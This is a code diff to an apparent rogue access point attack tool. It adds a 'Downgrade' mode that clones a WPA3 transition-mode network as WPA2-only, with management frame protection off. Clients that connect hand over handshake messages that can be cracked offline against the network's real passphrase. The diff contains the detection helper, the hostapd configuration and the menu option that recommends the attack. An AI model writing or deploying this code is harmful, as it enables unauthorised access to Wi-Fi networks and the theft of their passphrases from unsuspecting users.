@@ -40,9 +40,25 @@ console = Console()
 _runner = SubprocessRunner()
 
 CAPTURES_DIR = Path("captures")
-PERSONALITY_MIRROR  = 1
-PERSONALITY_UPGRADE = 2
-PERSONALITY_STEALTH = 3
+PERSONALITY_MIRROR   = 1
+PERSONALITY_UPGRADE  = 2
+PERSONALITY_STEALTH  = 3
+PERSONALITY_DOWNGRADE = 4   # WPA2-only clone of a WPA3-transition AP (SAE downgrade)
+
+
+def downgrade_recommended(target: Optional[dict]) -> bool:
+    """
+    True if *target* is a WPA3 transition-mode AP — the case where a WPA2-only
+    clone can coerce a WPA3-capable client onto the dictionary-crackable WPA2
+    4-way (the SAE downgrade attack surface). Reads the scanner's
+    ``security_tier`` / ``wpa3_downgrade_risk`` fields.
+    """
+    if not target:
+        return False
+    if target.get("wpa3_downgrade_risk"):
+        return True
+    tier = str(target.get("security_tier", "")).upper()
+    return "TRANS" in tier
 
 # ─── OUI vendor → portal template name ───────────────────────────────────────
 _VENDOR_PORTAL_MAP: dict[str, str] = {
@@ -246,6 +262,19 @@ def _write_hostapd_conf(
         rsn_pairwise=CCMP
         ieee80211w=2
         """)
+    elif personality == PERSONALITY_DOWNGRADE:
+        # WPA2-PSK only — no SAE. A WPA3-transition client that connects here
+        # completes a WPA2 4-way whose M2 MIC is derived from the *real* PSK, so
+        # the captured M1/M2 pair is dictionary-crackable. The passphrase is a
+        # throwaway (auth fails at M3, but M1+M2 is already captured).
+        security_block = textwrap.dedent("""\
+        wpa=2
+        wpa_key_mgmt=WPA-PSK
+        rsn_pairwise=CCMP
+        wpa_pairwise=CCMP
+        wpa_passphrase=downgrade1234
+        ieee80211w=0
+        """)
 
     conf = textwrap.dedent(f"""\
     interface={iface}
@@ -365,16 +394,20 @@ def phantom_menu(
     vendor  = (target.get("vendor") or "").lower()
 
     # ── Personality selection ─────────────────────────────────────────────
+    dg_hint = ("  [green](recommended: this is a WPA3 transition AP)[/green]"
+               if downgrade_recommended(target) else "")
     console.print(
         f"  Target: [cyan]{ssid}[/cyan]  [dim]{bssid}[/dim]  CH{channel}\n"
         "\n  Select Phantom AP personality:\n"
-        "  [1] Mirror  — beacon-identical clone (copies channel, rates, WMM)\n"
-        "  [2] Upgrade — same SSID, advertises WPA3 (lures upgrade-expecting clients)\n"
-        "  [3] Stealth — cloned SSID, no portal, passive handshake capture\n"
+        "  [1] Mirror   — beacon-identical clone (copies channel, rates, WMM)\n"
+        "  [2] Upgrade  — same SSID, advertises WPA3 (lures upgrade-expecting clients)\n"
+        "  [3] Stealth  — cloned SSID, no portal, passive handshake capture\n"
+        f"  [4] Downgrade — WPA2-only clone; coerces WPA3 clients onto a crackable "
+        f"WPA2 4-way{dg_hint}\n"
     )
     try:
         choice = int(input("  Personality [1]: ").strip() or "1")
-        if choice not in (1, 2, 3):
+        if choice not in (1, 2, 3, 4):
             choice = 1
     except (ValueError, KeyboardInterrupt):
         choice = 1
